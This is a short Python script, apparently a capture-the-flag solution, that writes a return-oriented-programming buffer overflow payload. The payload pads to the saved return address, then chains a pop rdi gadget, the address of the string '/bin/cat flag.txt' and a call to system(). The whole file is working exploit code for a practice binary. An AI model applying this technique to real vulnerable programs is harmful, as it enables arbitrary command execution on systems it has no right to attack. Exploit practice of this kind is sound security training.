cmd_addr = 0x00601060   ### "/bin/cat flag.txt"

pop_rdi_gadget_addr = 0x004007c3

call_sys_addr = 0x40074b

buf_addr = 0x7fffffffe140
rip_addr = 0x7fffffffe168

payload = (rip_addr - buf_addr) * b"x"

### Place gadget address as next function to be called.
payload += pop_rdi_gadget_addr.to_bytes(8, "little")

### Place command address as top of stack for gadget.
payload += cmd_addr.to_bytes(8, "little")

### Place address of call to system() as next function.
payload += call_sys_addr.to_bytes(8, "little")

with open("payload", "wb") as f:
    f.write(payload)

